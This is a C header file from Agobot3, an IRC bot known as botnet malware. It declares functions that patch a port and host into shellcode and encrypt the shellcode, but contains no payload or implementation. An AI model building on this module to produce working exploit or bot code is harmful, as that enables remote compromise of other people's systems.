/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef __SHELLCODE_H__
#define __SHELLCODE_H__

typedef bool (*SCCallbackFunc)(char *szShellBuf, int iShellBufSize);

bool contains(char *szBuf, int iSize, char cChar);
int setup_shellcode(char *szOrigShell, int iOrigShellSize, char *szShellBuf, int iShellBufSize, int iPort, int iHost, int iPortOffset, int iHostOffset, SCCallbackFunc pfnSC);
int encrypt_shellcode(char *szOrigShell, int iOrigShellSize, char *szShellBuf, int iShellBufSize, SCCallbackFunc pfnSC);

#endif // __SHELLCODE_H__
